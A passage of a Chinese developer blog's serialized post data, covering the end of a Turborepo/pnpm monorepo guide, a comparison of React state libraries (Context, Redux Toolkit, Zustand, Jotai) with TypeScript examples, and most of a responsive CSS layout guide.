\u7f13\u5b58\\n\\n```bash\\n# \u67e5\u770b\u7f13\u5b58\u72b6\u6001\\nturbo build --dry-run\\n\\n# \u5f3a\u5236\u5ffd\u7565\u7f13\u5b58\\nturbo build --force\\n\\n# \u8fdc\u7a0b\u7f13\u5b58\uff08\u56e2\u961f\u5171\u4eab\uff09\\nturbo login\\nturbo link\\n```\\n\\n---\\n\\n## \ud83d\udccb \u7248\u672c\u7ba1\u7406\\n\\n### \u4f7f\u7528 Changesets\\n\\n```bash\\npnpm add -Dw @changesets/cli\\npnpm changeset init\\n```\\n\\n### \u6dfb\u52a0\u53d8\u66f4\\n\\n```bash\\npnpm changeset\\n# \u9009\u62e9\u53d8\u66f4\u7684\u5305\\n# \u9009\u62e9\u7248\u672c\u7c7b\u578b\uff08patch/minor/major\uff09\\n# \u6dfb\u52a0\u53d8\u66f4\u63cf\u8ff0\\n```\\n\\n### \u53d1\u5e03\\n\\n```bash\\npnpm changeset version  # \u66f4\u65b0\u7248\u672c\u53f7\\npnpm changeset publish  # \u53d1\u5e03\u5230 npm\\n```\\n\\n---\\n\\n## \ud83d\udd27 \u5e38\u89c1\u95ee\u9898\\n\\n### 1. \u4f9d\u8d56\u63d0\u5347\\n\\n```yaml\\n# .npmrc\\nshamefully-hoist=true  # \u5fc5\u8981\u65f6\u542f\u7528\\n```\\n\\n### 2. \u7c7b\u578b\u5f15\u7528\\n\\n```json\\n// tsconfig.json\\n{\\n  \\"compilerOptions\\": {\\n    \\"paths\\": {\\n      \\"@repo/ui\\": [\\"../../packages/ui/src\\"],\\n      \\"@repo/utils\\": [\\"../../packages/utils/src\\"]\\n    }\\n  }\\n}\\n```\\n\\n### 3. \u6784\u5efa\u987a\u5e8f\\n\\n```json\\n// turbo.json\\n{\\n  \\"pipeline\\": {\\n    \\"build\\": {\\n      \\"dependsOn\\": [\\"^build\\"]  // \u5148\u6784\u5efa\u4f9d\u8d56\\n    }\\n  }\\n}\\n```\\n\\n---\\n\\n## \u2705 \u6700\u4f73\u5b9e\u8df5\\n\\n```markdown\\n1. \u5305\u547d\u540d\u7edf\u4e00 scope\\n   - @repo/ui, @repo/utils, @repo/config\\n\\n2. \u660e\u786e\u5305\u7684\u8fb9\u754c\\n   - \u6bcf\u4e2a\u5305\u804c\u8d23\u5355\u4e00\\n   - \u907f\u514d\u5faa\u73af\u4f9d\u8d56\\n\\n3. \u7edf\u4e00\u5de5\u5177\u94fe\\n   - \u5171\u4eab ESLint\u3001Prettier\u3001TypeScript \u914d\u7f6e\\n   - \u7edf\u4e00\u811a\u672c\u547d\u540d\uff08dev, build, lint, test\uff09\\n\\n4. \u4f18\u5316 CI/CD\\n   - \u5229\u7528\u7f13\u5b58\u51cf\u5c11\u6784\u5efa\u65f6\u95f4\\n   - \u53ea\u6784\u5efa\u53d7\u5f71\u54cd\u7684\u5305\\n\\n5. \u6587\u6863\u5b8c\u5584\\n   - \u6bcf\u4e2a\u5305\u6709 README\\n   - \u8d21\u732e\u6307\u5357\\n```\\n\\n---\\n\\n## \ud83d\udcda \u63a8\u8350\u8d44\u6e90\\n\\n- [Turborepo \u6587\u6863](https://turbo.build/repo/docs)\\n- [pnpm Workspaces](https://pnpm.io/workspaces)\\n- [Monorepo.tools](https://monorepo.tools/)\\n\\n---\\n\\nMonorepo \u9002\u5408\u6709\u591a\u4e2a\u76f8\u5173\u9879\u76ee\u7684\u573a\u666f\u3002\u9009\u62e9\u5408\u9002\u7684\u5de5\u5177\uff0c\u5efa\u7acb\u597d\u89c4\u8303\uff0c\u80fd\u5927\u5e45\u63d0\u5347\u5f00\u53d1\u6548\u7387\u3002"},{"id":"state-management","metadata":{"permalink":"/blog/state-management","editUrl":"https://github.com/hweos/git-pages/edit/main/blog/2024-08-20-state-management.md","source":"@site/blog/2024-08-20-state-management.md","title":"React \u72b6\u6001\u7ba1\u7406\u65b9\u6848\u5bf9\u6bd4","description":"React \u72b6\u6001\u7ba1\u7406\u65b9\u6848\u4f17\u591a\uff0c\u5982\u4f55\u9009\u62e9\uff1f\u672c\u6587\u5bf9\u6bd4\u4e3b\u6d41\u65b9\u6848\u7684\u4f18\u7f3a\u70b9\u548c\u9002\u7528\u573a\u666f\u3002","date":"2024-08-20T00:00:00.000Z","tags":[{"inline":true,"label":"React","permalink":"/blog/tags/react"},{"inline":true,"label":"\u72b6\u6001\u7ba1\u7406","permalink":"/blog/tags/\u72b6\u6001\u7ba1\u7406"},{"inline":true,"label":"Redux","permalink":"/blog/tags/redux"},{"inline":true,"label":"Zustand","permalink":"/blog/tags/zustand"}],"readingTime":4.85,"hasTruncateMarker":true,"authors":[{"name":"Mason","title":"Full Stack Developer","url":"https://github.com/HuangZhe007","socials":{"github":"https://github.com/HuangZhe007"},"imageURL":"https://avatars.githubusercontent.com/u/45168628?v=4","key":"mason","page":null}],"frontMatter":{"slug":"state-management","title":"React \u72b6\u6001\u7ba1\u7406\u65b9\u6848\u5bf9\u6bd4","authors":"mason","tags":["React","\u72b6\u6001\u7ba1\u7406","Redux","Zustand"]},"unlisted":false,"prevItem":{"title":"Monorepo \u5b9e\u8df5\u6307\u5357","permalink":"/blog/monorepo-guide"},"nextItem":{"title":"\u54cd\u5e94\u5f0f\u8bbe\u8ba1\u5b9e\u6218\u6307\u5357","permalink":"/blog/responsive-design"}},"content":"React \u72b6\u6001\u7ba1\u7406\u65b9\u6848\u4f17\u591a\uff0c\u5982\u4f55\u9009\u62e9\uff1f\u672c\u6587\u5bf9\u6bd4\u4e3b\u6d41\u65b9\u6848\u7684\u4f18\u7f3a\u70b9\u548c\u9002\u7528\u573a\u666f\u3002\\n\\n\x3c!--truncate--\x3e\\n\\n## \ud83c\udfaf \u65b9\u6848\u6982\u89c8\\n\\n| \u65b9\u6848 | \u5305\u5927\u5c0f | \u5b66\u4e60\u66f2\u7ebf | \u9002\u7528\u573a\u666f |\\n|------|--------|----------|----------|\\n| React Context | \u5185\u7f6e | \u4f4e | \u7b80\u5355\u72b6\u6001 |\\n| Redux Toolkit | ~11kb | \u4e2d | \u5927\u578b\u5e94\u7528 |\\n| Zustand | ~1kb | \u4f4e | \u4e2d\u5c0f\u578b\u5e94\u7528 |\\n| Jotai | ~2kb | \u4f4e | \u539f\u5b50\u5316\u72b6\u6001 |\\n| Recoil | ~20kb | \u4e2d | \u590d\u6742\u4f9d\u8d56 |\\n\\n---\\n\\n## \ud83d\udce6 React Context\\n\\n### \u57fa\u672c\u4f7f\u7528\\n\\n```tsx\\nimport { createContext, useContext, useState, ReactNode } from \'react\';\\n\\n// \u5b9a\u4e49\u7c7b\u578b\\ninterface AuthState {\\n  user: User | null;\\n  login: (user: User) => void;\\n  logout: () => void;\\n}\\n\\n// \u521b\u5efa Context\\nconst AuthContext = createContext<AuthState | null>(null);\\n\\n// Provider \u7ec4\u4ef6\\nexport function AuthProvider({ children }: { children: ReactNode }) {\\n  const [user, setUser] = useState<User | null>(null);\\n\\n  const login = (user: User) => setUser(user);\\n  const logout = () => setUser(null);\\n\\n  return (\\n    <AuthContext.Provider value={{ user, login, logout }}>\\n      {children}\\n    </AuthContext.Provider>\\n  );\\n}\\n\\n// \u81ea\u5b9a\u4e49 Hook\\nexport function useAuth() {\\n  const context = useContext(AuthContext);\\n  if (!context) {\\n    throw new Error(\'useAuth must be used within AuthProvider\');\\n  }\\n  return context;\\n}\\n```\\n\\n### \u4f18\u5316\u91cd\u6e32\u67d3\\n\\n```tsx\\n// \u62c6\u5206 Context\\nconst UserContext = createContext<User | null>(null);\\nconst UserActionsContext = createContext<{\\n  login: (user: User) => void;\\n  logout: () => void;\\n} | null>(null);\\n\\n// \u4f7f\u7528 useMemo \u4f18\u5316\\nfunction AuthProvider({ children }: { children: ReactNode }) {\\n  const [user, setUser] = useState<User | null>(null);\\n\\n  const actions = useMemo(() => ({\\n    login: (user: User) => setUser(user),\\n    logout: () => setUser(null),\\n  }), []);\\n\\n  return (\\n    <UserContext.Provider value={user}>\\n      <UserActionsContext.Provider value={actions}>\\n        {children}\\n      </UserActionsContext.Provider>\\n    </UserContext.Provider>\\n  );\\n}\\n```\\n\\n### \u4f18\u7f3a\u70b9\\n\\n```markdown\\n\u2705 \u4f18\u70b9\uff1a\\n- \u5185\u7f6e\uff0c\u65e0\u9700\u989d\u5916\u4f9d\u8d56\\n- \u7b80\u5355\u6613\u7528\\n- \u9002\u5408\u4e3b\u9898\u3001\u8bed\u8a00\u7b49\u4f4e\u9891\u66f4\u65b0\u72b6\u6001\\n\\n\u274c \u7f3a\u70b9\uff1a\\n- \u65e0\u6cd5\u9009\u62e9\u6027\u8ba2\u9605\\n- \u6027\u80fd\u4f18\u5316\u9700\u8981\u624b\u52a8\u5904\u7406\\n- \u4e0d\u9002\u5408\u9891\u7e41\u66f4\u65b0\u7684\u72b6\u6001\\n```\\n\\n---\\n\\n## \ud83d\udd27 Redux Toolkit\\n\\n### \u57fa\u672c\u4f7f\u7528\\n\\n```tsx\\nimport { configureStore, createSlice, PayloadAction } from \'@reduxjs/toolkit\';\\nimport { Provider, useSelector, useDispatch } from \'react-redux\';\\n\\n// \u521b\u5efa Slice\\nconst counterSlice = createSlice({\\n  name: \'counter\',\\n  initialState: { value: 0 },\\n  reducers: {\\n    increment: (state) => {\\n      state.value += 1;\\n    },\\n    decrement: (state) => {\\n      state.value -= 1;\\n    },\\n    incrementByAmount: (state, action: PayloadAction<number>) => {\\n      state.value += action.payload;\\n    },\\n  },\\n});\\n\\nexport const { increment, decrement, incrementByAmount } = counterSlice.actions;\\n\\n// \u521b\u5efa Store\\nconst store = configureStore({\\n  reducer: {\\n    counter: counterSlice.reducer,\\n  },\\n});\\n\\ntype RootState = ReturnType<typeof store.getState>;\\ntype AppDispatch = typeof store.dispatch;\\n\\n// \u7c7b\u578b\u5316 Hooks\\nexport const useAppDispatch = () => useDispatch<AppDispatch>();\\nexport const useAppSelector = <T>(selector: (state: RootState) => T) => \\n  useSelector(selector);\\n\\n// \u4f7f\u7528\\nfunction Counter() {\\n  const count = useAppSelector((state) => state.counter.value);\\n  const dispatch = useAppDispatch();\\n\\n  return (\\n    <div>\\n      <span>{count}</span>\\n      <button onClick={() => dispatch(increment())}>+</button>\\n      <button onClick={() => dispatch(decrement())}>-</button>\\n    </div>\\n  );\\n}\\n```\\n\\n### \u5f02\u6b65\u64cd\u4f5c (createAsyncThunk)\\n\\n```tsx\\nimport { createAsyncThunk, createSlice } from \'@reduxjs/toolkit\';\\n\\n// \u5f02\u6b65 Action\\nexport const fetchUser = createAsyncThunk(\\n  \'user/fetch\',\\n  async (userId: string) => {\\n    const response = await fetch(`/api/users/${userId}`);\\n    return response.json();\\n  }\\n);\\n\\nconst userSlice = createSlice({\\n  name: \'user\',\\n  initialState: {\\n    data: null as User | null,\\n    loading: false,\\n    error: null as string | null,\\n  },\\n  reducers: {},\\n  extraReducers: (builder) => {\\n    builder\\n      .addCase(fetchUser.pending, (state) => {\\n        state.loading = true;\\n        state.error = null;\\n      })\\n      .addCase(fetchUser.fulfilled, (state, action) => {\\n        state.loading = false;\\n        state.data = action.payload;\\n      })\\n      .addCase(fetchUser.rejected, (state, action) => {\\n        state.loading = false;\\n        state.error = action.error.message || \'Failed\';\\n      });\\n  },\\n});\\n```\\n\\n### \u4f18\u7f3a\u70b9\\n\\n```markdown\\n\u2705 \u4f18\u70b9\uff1a\\n- \u6210\u719f\u7a33\u5b9a\uff0c\u751f\u6001\u4e30\u5bcc\\n- DevTools \u5f3a\u5927\\n- \u9002\u5408\u5927\u578b\u56e2\u961f\u534f\u4f5c\\n- RTK Query \u5904\u7406\u6570\u636e\u83b7\u53d6\\n\\n\u274c \u7f3a\u70b9\uff1a\\n- \u6837\u677f\u4ee3\u7801\u8f83\u591a\\n- \u5b66\u4e60\u66f2\u7ebf\u8f83\u9661\\n- \u5305\u4f53\u79ef\u8f83\u5927\\n```\\n\\n---\\n\\n## \ud83d\udc3b Zustand\\n\\n### \u57fa\u672c\u4f7f\u7528\\n\\n```tsx\\nimport { create } from \'zustand\';\\n\\ninterface BearState {\\n  bears: number;\\n  increase: () => void;\\n  decrease: () => void;\\n  reset: () => void;\\n}\\n\\nconst useBearStore = create<BearState>((set) => ({\\n  bears: 0,\\n  increase: () => set((state) => ({ bears: state.bears + 1 })),\\n  decrease: () => set((state) => ({ bears: state.bears - 1 })),\\n  reset: () => set({ bears: 0 }),\\n}));\\n\\n// \u4f7f\u7528\\nfunction BearCounter() {\\n  const bears = useBearStore((state) => state.bears);\\n  const increase = useBearStore((state) => state.increase);\\n\\n  return (\\n    <div>\\n      <span>{bears} bears</span>\\n      <button onClick={increase}>Add bear</button>\\n    </div>\\n  );\\n}\\n```\\n\\n### \u5f02\u6b65\u64cd\u4f5c\\n\\n```tsx\\nconst useUserStore = create<UserState>((set, get) => ({\\n  user: null,\\n  loading: false,\\n  error: null,\\n  \\n  fetchUser: async (id: string) => {\\n    set({ loading: true, error: null });\\n    try {\\n      const res = await fetch(`/api/users/${id}`);\\n      const user = await res.json();\\n      set({ user, loading: false });\\n    } catch (error) {\\n      set({ error: error.message, loading: false });\\n    }\\n  },\\n}));\\n```\\n\\n### \u6301\u4e45\u5316\\n\\n```tsx\\nimport { persist } from \'zustand/middleware\';\\n\\nconst useAuthStore = create(\\n  persist<AuthState>(\\n    (set) => ({\\n      token: null,\\n      setToken: (token) => set({ token }),\\n    }),\\n    {\\n      name: \'auth-storage\', // localStorage key\\n    }\\n  )\\n);\\n```\\n\\n### \u4f18\u7f3a\u70b9\\n\\n```markdown\\n\u2705 \u4f18\u70b9\uff1a\\n- \u6781\u7b80 API\uff0c\u5b66\u4e60\u6210\u672c\u4f4e\\n- \u5305\u4f53\u79ef\u5c0f (~1kb)\\n- \u65e0\u9700 Provider\\n- \u9009\u62e9\u6027\u8ba2\u9605\uff0c\u6027\u80fd\u597d\\n\\n\u274c \u7f3a\u70b9\uff1a\\n- DevTools \u529f\u80fd\u8f83\u5f31\\n- \u751f\u6001\u4e0d\u5982 Redux \u4e30\u5bcc\\n```\\n\\n---\\n\\n## \u269b\ufe0f Jotai\\n\\n### \u57fa\u672c\u4f7f\u7528\\n\\n```tsx\\nimport { atom, useAtom, useAtomValue, useSetAtom } from \'jotai\';\\n\\n// \u521b\u5efa\u539f\u5b50\\nconst countAtom = atom(0);\\nconst doubleCountAtom = atom((get) => get(countAtom) * 2);\\n\\n// \u4f7f\u7528\\nfunction Counter() {\\n  const [count, setCount] = useAtom(countAtom);\\n  const doubleCount = useAtomValue(doubleCountAtom);\\n\\n  return (\\n    <div>\\n      <span>{count} (double: {doubleCount})</span>\\n      <button onClick={() => setCount((c) => c + 1)}>+</button>\\n    </div>\\n  );\\n}\\n```\\n\\n### \u6d3e\u751f\u539f\u5b50\\n\\n```tsx\\nconst usersAtom = atom<User[]>([]);\\nconst userCountAtom = atom((get) => get(usersAtom).length);\\nconst activeUsersAtom = atom((get) => \\n  get(usersAtom).filter((u) => u.active)\\n);\\n\\n// \u53ef\u5199\u6d3e\u751f\u539f\u5b50\\nconst uppercaseAtom = atom(\\n  (get) => get(textAtom).toUpperCase(),\\n  (get, set, newValue: string) => {\\n    set(textAtom, newValue.toLowerCase());\\n  }\\n);\\n```\\n\\n### \u5f02\u6b65\u539f\u5b50\\n\\n```tsx\\nconst userAtom = atom(async () => {\\n  const res = await fetch(\'/api/user\');\\n  return res.json();\\n});\\n\\nfunction User() {\\n  const user = useAtomValue(userAtom); // \u81ea\u52a8 Suspense\\n  return <div>{user.name}</div>;\\n}\\n\\n// \u914d\u5408 Suspense\\n<Suspense fallback={<Loading />}>\\n  <User />\\n</Suspense>\\n```\\n\\n### \u4f18\u7f3a\u70b9\\n\\n```markdown\\n\u2705 \u4f18\u70b9\uff1a\\n- \u539f\u5b50\u5316\uff0c\u7ec6\u7c92\u5ea6\u66f4\u65b0\\n- \u4e0e Suspense \u914d\u5408\u597d\\n- \u6d3e\u751f\u72b6\u6001\u7b80\u6d01\\n- TypeScript \u53cb\u597d\\n\\n\u274c \u7f3a\u70b9\uff1a\\n- \u539f\u5b50\u592a\u591a\u65f6\u7ba1\u7406\u590d\u6742\\n- Debug \u4e0d\u5982 Redux \u65b9\u4fbf\\n```\\n\\n---\\n\\n## \ud83d\udd0d \u5982\u4f55\u9009\u62e9\\n\\n### \u51b3\u7b56\u6d41\u7a0b\\n\\n```markdown\\n1. \u72b6\u6001\u7b80\u5355\uff0c\u66f4\u65b0\u4e0d\u9891\u7e41\uff1f\\n   \u2192 React Context\\n\\n2. \u9700\u8981\u5f3a\u5927\u7684 DevTools \u548c\u4e2d\u95f4\u4ef6\uff1f\\n   \u2192 Redux Toolkit\\n\\n3. \u8ffd\u6c42\u7b80\u6d01\u548c\u5c0f\u4f53\u79ef\uff1f\\n   \u2192 Zustand\\n\\n4. \u9700\u8981\u539f\u5b50\u5316\u548c\u6d3e\u751f\u72b6\u6001\uff1f\\n   \u2192 Jotai\\n\\n5. \u9700\u8981\u5f02\u6b65\u4f9d\u8d56\u548c\u6570\u636e\u6d41\uff1f\\n   \u2192 Recoil \u6216 Jotai\\n```\\n\\n### \u573a\u666f\u63a8\u8350\\n\\n| \u573a\u666f | \u63a8\u8350\u65b9\u6848 |\\n|------|----------|\\n| \u4e3b\u9898/\u8bed\u8a00\u5207\u6362 | Context |\\n| \u7528\u6237\u8ba4\u8bc1\u72b6\u6001 | Zustand / Context |\\n| \u590d\u6742\u8868\u5355\u72b6\u6001 | Jotai |\\n| \u5927\u578b\u4f01\u4e1a\u5e94\u7528 | Redux Toolkit |\\n| \u4e2d\u5c0f\u578b\u5e94\u7528 | Zustand |\\n| \u670d\u52a1\u7aef\u6570\u636e\u7f13\u5b58 | React Query + \u7b80\u5355\u72b6\u6001\u7ba1\u7406 |\\n\\n---\\n\\n## \ud83d\udca1 \u6700\u4f73\u5b9e\u8df5\\n\\n### 1. \u5206\u79bb\u670d\u52a1\u7aef\u548c\u5ba2\u6237\u7aef\u72b6\u6001\\n\\n```tsx\\n// \u670d\u52a1\u7aef\u72b6\u6001\u7528 React Query\\nconst { data: user } = useQuery([\'user\', id], fetchUser);\\n\\n// \u5ba2\u6237\u7aef\u72b6\u6001\u7528 Zustand\\nconst { theme, setTheme } = useThemeStore();\\n```\\n\\n### 2. \u6309\u9886\u57df\u62c6\u5206 Store\\n\\n```tsx\\n// \u4e0d\u8981\u4e00\u4e2a\u5de8\u5927\u7684 Store\\n// \u6309\u529f\u80fd\u62c6\u5206\\nconst useAuthStore = create(...);\\nconst useCartStore = create(...);\\nconst useUIStore = create(...);\\n```\\n\\n### 3. \u9009\u62e9\u6027\u8ba2\u9605\\n\\n```tsx\\n// \u274c \u8ba2\u9605\u6574\u4e2a store\\nconst store = useBearStore();\\n\\n// \u2705 \u53ea\u8ba2\u9605\u9700\u8981\u7684\u90e8\u5206\\nconst bears = useBearStore((state) => state.bears);\\n```\\n\\n---\\n\\n\u6ca1\u6709\u94f6\u5f39\uff0c\u9009\u62e9\u9002\u5408\u9879\u76ee\u89c4\u6a21\u548c\u56e2\u961f\u7684\u65b9\u6848\u6700\u91cd\u8981\u3002"},{"id":"responsive-design","metadata":{"permalink":"/blog/responsive-design","editUrl":"https://github.com/hweos/git-pages/edit/main/blog/2024-08-10-responsive-design.md","source":"@site/blog/2024-08-10-responsive-design.md","title":"\u54cd\u5e94\u5f0f\u8bbe\u8ba1\u5b9e\u6218\u6307\u5357","description":"\u54cd\u5e94\u5f0f\u8bbe\u8ba1\u8ba9\u7f51\u7ad9\u5728\u5404\u79cd\u8bbe\u5907\u4e0a\u90fd\u80fd\u826f\u597d\u5c55\u793a\u3002\u672c\u6587\u5206\u4eab\u54cd\u5e94\u5f0f\u5e03\u5c40\u7684\u5b9e\u7528\u6280\u5de7\u3002","date":"2024-08-10T00:00:00.000Z","tags":[{"inline":true,"label":"CSS","permalink":"/blog/tags/css"},{"inline":true,"label":"\u54cd\u5e94\u5f0f","permalink":"/blog/tags/\u54cd\u5e94\u5f0f"},{"inline":true,"label":"\u524d\u7aef","permalink":"/blog/tags/\u524d\u7aef"}],"readingTime":4.75,"hasTruncateMarker":true,"authors":[{"name":"Mason","title":"Full Stack Developer","url":"https://github.com/HuangZhe007","socials":{"github":"https://github.com/HuangZhe007"},"imageURL":"https://avatars.githubusercontent.com/u/45168628?v=4","key":"mason","page":null}],"frontMatter":{"slug":"responsive-design","title":"\u54cd\u5e94\u5f0f\u8bbe\u8ba1\u5b9e\u6218\u6307\u5357","authors":"mason","tags":["CSS","\u54cd\u5e94\u5f0f","\u524d\u7aef"]},"unlisted":false,"prevItem":{"title":"React \u72b6\u6001\u7ba1\u7406\u65b9\u6848\u5bf9\u6bd4","permalink":"/blog/state-management"},"nextItem":{"title":"npm/pnpm \u5305\u7ba1\u7406\u5b9e\u8df5\u6307\u5357","permalink":"/blog/npm-pnpm-guide"}},"content":"\u54cd\u5e94\u5f0f\u8bbe\u8ba1\u8ba9\u7f51\u7ad9\u5728\u5404\u79cd\u8bbe\u5907\u4e0a\u90fd\u80fd\u826f\u597d\u5c55\u793a\u3002\u672c\u6587\u5206\u4eab\u54cd\u5e94\u5f0f\u5e03\u5c40\u7684\u5b9e\u7528\u6280\u5de7\u3002\\n\\n\x3c!--truncate--\x3e\\n\\n## \ud83d\udcf1 \u54cd\u5e94\u5f0f\u57fa\u7840\\n\\n### viewport \u8bbe\u7f6e\\n\\n```html\\n\x3c!-- \u5fc5\u987b\u7684 meta \u6807\u7b7e --\x3e\\n<meta name=\\"viewport\\" content=\\"width=device-width, initial-scale=1.0\\">\\n```\\n\\n### \u65ad\u70b9\u8bbe\u8ba1\\n\\n```css\\n/* \u5e38\u7528\u65ad\u70b9 */\\n/* \u79fb\u52a8\u7aef\u4f18\u5148 */\\n@media (min-width: 576px) { /* \u5927\u624b\u673a */ }\\n@media (min-width: 768px) { /* \u5e73\u677f */ }\\n@media (min-width: 992px) { /* \u684c\u9762 */ }\\n@media (min-width: 1200px) { /* \u5927\u684c\u9762 */ }\\n\\n/* \u684c\u9762\u4f18\u5148 */\\n@media (max-width: 1199px) { /* \u5c0f\u684c\u9762 */ }\\n@media (max-width: 991px) { /* \u5e73\u677f */ }\\n@media (max-width: 767px) { /* \u624b\u673a */ }\\n```\\n\\n### CSS \u53d8\u91cf\u7ba1\u7406\\n\\n```css\\n:root {\\n  --container-width: 1200px;\\n  --spacing: 16px;\\n  --font-size-base: 16px;\\n}\\n\\n@media (max-width: 768px) {\\n  :root {\\n    --container-width: 100%;\\n    --spacing: 12px;\\n    --font-size-base: 14px;\\n  }\\n}\\n```\\n\\n---\\n\\n## \ud83d\udcd0 \u5e03\u5c40\u6280\u5de7\\n\\n### Flexbox \u54cd\u5e94\u5f0f\\n\\n```css\\n.container {\\n  display: flex;\\n  flex-wrap: wrap;\\n  gap: 16px;\\n}\\n\\n.item {\\n  flex: 1 1 300px; /* \u81f3\u5c11 300px\uff0c\u81ea\u52a8\u6362\u884c */\\n}\\n\\n/* \u6216\u4f7f\u7528\u5a92\u4f53\u67e5\u8be2 */\\n@media (max-width: 768px) {\\n  .container {\\n    flex-direction: column;\\n  }\\n}\\n```\\n\\n### Grid \u54cd\u5e94\u5f0f\\n\\n```css\\n/* \u81ea\u9002\u5e94\u5217\u6570 */\\n.grid {\\n  display: grid;\\n  grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));\\n  gap: 16px;\\n}\\n\\n/* \u4f7f\u7528\u5a92\u4f53\u67e5\u8be2 */\\n.grid {\\n  display: grid;\\n  grid-template-columns: repeat(4, 1fr);\\n  gap: 16px;\\n}\\n\\n@media (max-width: 992px) {\\n  .grid {\\n    grid-template-columns: repeat(2, 1fr);\\n  }\\n}\\n\\n@media (max-width: 576px) {\\n  .grid {\\n    grid-template-columns: 1fr;\\n  }\\n}\\n```\\n\\n### Container Queries\\n\\n```css\\n/* \u57fa\u4e8e\u5bb9\u5668\u5c3a\u5bf8\u800c\u975e\u89c6\u53e3 */\\n.card-container {\\n  container-type: inline-size;\\n}\\n\\n@container (min-width: 400px) {\\n  .card {\\n    display: flex;\\n    flex-direction: row;\\n  }\\n}\\n\\n@container (max-width: 399px) {\\n  .card {\\n    display: flex;\\n    flex-direction: column;\\n  }\\n}\\n```\\n\\n---\\n\\n## \ud83d\uddbc\ufe0f \u54cd\u5e94\u5f0f\u56fe\u7247\\n\\n### srcset \u548c sizes\\n\\n```html\\n<img \\n  src=\\"image-800.jpg\\"\\n  srcset=\\"\\n    image-400.jpg 400w,\\n    image-800.jpg 800w,\\n    image-1200.jpg 1200w\\n  \\"\\n  sizes=\\"\\n    (max-width: 600px) 100vw,\\n    (max-width: 1000px) 50vw,\\n    800px\\n  \\"\\n  alt=\\"\u54cd\u5e94\u5f0f\u56fe\u7247\\"\\n>\\n```\\n\\n### picture \u5143\u7d20\\n\\n```html\\n<picture>\\n  \x3c!-- \u827a\u672f\u65b9\u5411\uff1a\u4e0d\u540c\u5c3a\u5bf8\u4f7f\u7528\u4e0d\u540c\u56fe\u7247 --\x3e\\n  <source media=\\"(min-width: 1200px)\\" srcset=\\"hero-desktop.jpg\\">\\n  <source media=\\"(min-width: 768px)\\" srcset=\\"hero-tablet.jpg\\">\\n  <img src=\\"hero-mobile.jpg\\" alt=\\"Hero\\">\\n</picture>\\n\\n\x3c!-- \u683c\u5f0f\u964d\u7ea7 --\x3e\\n<picture>\\n  <source type=\\"image/avif\\" srcset=\\"image.avif\\">\\n  <source type=\\"image/webp\\" srcset=\\"image.webp\\">\\n  <img src=\\"image.jpg\\" alt=\\"\u56fe\u7247\\">\\n</picture>\\n```\\n\\n### CSS \u80cc\u666f\u56fe\\n\\n```css\\n.hero {\\n  background-image: url(\'hero-mobile.jpg\');\\n  background-size: cover;\\n}\\n\\n@media (min-width: 768px) {\\n  .hero {\\n    background-image: url(\'hero-tablet.jpg\');\\n  }\\n}\\n\\n@media (min-width: 1200px) {\\n  .hero {\\n    background-image: url(\'hero-desktop.jpg\');\\n  }\\n}\\n\\n/* \u6216\u4f7f\u7528 image-set */\\n.hero {\\n  background-image: image-set(\\n    url(\'hero.avif\') type(\'image/avif\'),\\n    url(\'hero.webp\') type(\'image/webp\'),\\n    url(\'hero.jpg\') type(\'image/jpeg\')\\n  );\\n}\\n```\\n\\n---\\n\\n## \ud83d\udcdd \u54cd\u5e94\u5f0f\u6392\u7248\\n\\n### \u6d41\u4f53\u5b57\u4f53\\n\\n```css\\n/* clamp(\u6700\u5c0f\u503c, \u9996\u9009\u503c, \u6700\u5927\u503c) */\\nh1 {\\n  font-size: clamp(1.5rem, 4vw, 3rem);\\n}\\n\\np {\\n  font-size: clamp(1rem, 2vw, 1.25rem);\\n}\\n\\n/* \u95f4\u8ddd\u4e5f\u53ef\u4ee5\u4f7f\u7528 */\\n.section {\\n  padding: clamp(1rem, 5vw, 4rem);\\n}\\n```\\n\\n### \u884c\u9ad8\u548c\u95f4\u8ddd\\n\\n```css\\nbody {\\n  font-size: 16px;\\n  line-height: 1.6;\\n}\\n\\n@media (max-width: 768px) {\\n  body {\\n    font-size: 14px;\\n    line-height: 1.5;\\n  }\\n}\\n\\nh1, h2, h3 {\\n  line-height: 1.2;\\n}\\n```\\n\\n---\\n\\n## \ud83e\udded \u5bfc\u822a\u54cd\u5e94\u5f0f\\n\\n### \u6c49\u5821\u83dc\u5355\\n\\n```html\\n<nav class=\\"navbar\\">\\n  <div class=\\"logo\\">Logo</div>\\n  <button class=\\"menu-toggle\\" aria-label=\\"\u83dc\u5355\\">\\n    <span></span>\\n    <span></span>\\n    <span></span>\\n  </button>\\n  <ul class=\\"nav-links\\">\\n    <li><a href=\\"#\\">\u9996\u9875</a></li>\\n    <li><a href=\\"#\\">\u5173\u4e8e</a></li>\\n    <li><a href=\\"#\\">\u670d\u52a1</a></li>\\n    <li><a href=\\"#\\">\u8054\u7cfb</a></li>\\n  </ul>\\n</nav>\\n```\\n\\n```css\\n.navbar {\\n  display: flex;\\n  justify-content: space-between;\\n  align-items: center;\\n  padding: 1rem;\\n}\\n\\n.nav-links {\\n  display: flex;\\n  gap: 2rem;\\n  list-style: none;\\n}\\n\\n.menu-toggle {\\n  display: none;\\n}\\n\\n@media (max-width: 768px) {\\n  .menu-toggle {\\n    display: flex;\\n    flex-direction: column;\\n    gap: 4px;\\n    background: none;\\n    border: none;\\n    cursor: pointer;\\n  }\\n\\n  .menu-toggle span {\\n    width: 24px;\\n    height: 2px;\\n    background: #333;\\n  }\\n\\n  .nav-links {\\n    display: none;\\n    position: absolute;\\n    top: 60px;\\n    left: 0;\\n    right: 0;\\n    flex-direction: column;\\n    background: white;\\n    padding: 1rem;\\n  }\\n\\n  .nav-links.active {\\n    display: flex;\\n  }\\n}\\n```\\n\\n---\\n\\n## \ud83d\udcca \u8868\u683c\u54cd\u5e94\u5f0f\\n\\n### \u65b9\u6848 1\uff1a\u6a2a\u5411\u6eda\u52a8\\n\\n```css\\n.table-container {\\n  overflow-x: auto;\\n}\\n\\ntable {\\n  min-width: 600px;\\n}\\n```\\n\\n### \u65b9\u6848 2\uff1a\u5361\u7247\u5316\\n\\n```css\\n@media (max-width: 768px) {\\n  table, thead, tbody, th, td, tr {\\n    display: block;\\n  }\\n\\n  thead {\\n    display: none;\\n  }\\n\\n  tr {\\n    margin-bottom: 1rem;\\n    border: 1px solid #ddd;\\n  }\\n\\n  td {\\n    display: flex;\\n    justify-content: space-between;\\n    padding: 0.5rem;\\n    border-bottom: 1px solid #eee;\\n  }\\n\\n  td::before {\\n    content: attr(data-label);\\n    font-weight: bold;\\n  }\\n}\\n```\\n\\n```html\\n<tr>\\n  <td data-label=\\"\u59d3\u540d\\">\u5f20\u4e09</td>\\n  <td 